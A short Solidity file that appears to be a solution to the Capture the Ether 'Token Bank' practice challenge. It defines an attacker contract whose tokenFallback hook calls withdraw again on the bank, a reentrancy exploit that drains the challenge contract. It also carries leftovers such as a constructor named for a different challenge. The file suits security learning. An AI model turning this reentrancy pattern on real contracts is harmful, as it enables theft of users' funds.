pragma solidity ^0.4.21;


import "../../../Exercise/CaptureTheEther/7/TokenBank.sol";
import "hardhat/console.sol";

contract AttackAttackTokenBank is ITokenReceiver {
    TokenBankChallenge public tokenBank;

    function AttackPredictTheBlockHash(){
    }

    function setBank(TokenBankChallenge importingContract) external {
        tokenBank = importingContract;
    }

    function attack() public {
             tokenBank.withdraw(500000 * 10**18);
    }

    function tokenFallback(address from, uint256 value, bytes data) external {
        if (!tokenBank.isComplete()) {
            tokenBank.withdraw(500000 * 10**18);
        }
    }



}
